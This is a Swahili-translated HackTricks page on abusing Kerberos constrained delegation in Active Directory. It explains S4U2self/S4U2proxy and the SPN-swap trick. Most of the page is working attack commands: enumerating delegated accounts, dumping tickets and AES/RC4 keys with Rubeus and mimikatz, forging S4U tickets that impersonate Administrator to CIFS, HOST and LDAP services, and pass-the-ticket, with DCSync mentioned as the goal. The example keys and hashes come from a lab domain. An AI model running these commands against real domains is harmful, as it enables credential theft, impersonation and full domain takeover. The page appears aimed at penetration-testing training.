# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Kwa kutumia hii, msimamizi wa Domain anaweza **kuruhusu** kompyuta **kujifanya** kama mtumiaji au kompyuta dhidi ya **huduma** ya mashine.

- **Huduma kwa Mtumiaji kujitenga (**_**S4U2self**_**):** Ikiwa **akaunti ya huduma** ina thamani ya _userAccountControl_ inayojumuisha [TRUSTED_TO_AUTH_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), basi inaweza kupata TGS kwa ajili yake mwenyewe (huduma) kwa niaba ya mtumiaji mwingine yeyote.
- **Huduma kwa Mtumiaji Proxy(**_**S4U2proxy**_**):** **Akaunti ya huduma** inaweza kupata TGS kwa niaba ya mtumiaji yeyote kwa huduma iliyoainishwa katika **msDS-AllowedToDelegateTo.** Ili kufanya hivyo, kwanza inahitaji TGS kutoka kwa mtumiaji huyo kwa ajili yake, lakini inaweza kutumia S4U2self kupata TGS hiyo kabla ya kuomba nyingine.

**Kumbuka**: Ikiwa mtumiaji amewekwa alama kama ‘_Akaunti ni nyeti na haiwezi kuhamasishwa_’ katika AD, huwezi **kujifanya** nao.

Hii inamaanisha kwamba ikiwa utachafua hash ya huduma, unaweza **kujifanya kwa watumiaji** na kupata **ufikiaji** kwa niaba yao kwa **huduma iliyowekwa** (inawezekana **privesc**).

Zaidi ya hayo, **hutakuwa na ufikiaji tu kwa huduma ambayo mtumiaji anaweza kujifanya, bali pia kwa huduma yoyote** kwa sababu SPN (jina la huduma iliyohitajika) halijakaguliwa, ni ruhusa pekee. Hivyo, ikiwa una ufikiaji kwa **huduma ya CIFS** unaweza pia kuwa na ufikiaji kwa **huduma ya HOST** ukitumia bendera ya `/altservice` katika Rubeus.

Pia, **ufikiaji wa huduma ya LDAP kwenye DC**, ndio inahitajika ili kutumia **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Kuna **njia nyingine za kupata tiketi ya TGT** au **RC4** au **AES256** bila kuwa SYSTEM kwenye kompyuta kama Printer Bug na unconstrained delegation, NTLM relaying na matumizi mabaya ya Active Directory Certificate Service
>
> **Kuwa na tiketi hiyo ya TGT (au iliyohashwa) unaweza kufanya shambulio hili bila kuathiri kompyuta nzima.**
```bash:Using Rubeus
#Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

#Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Taarifa zaidi katika ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)

{{#include ../../banners/hacktricks-training.md}}
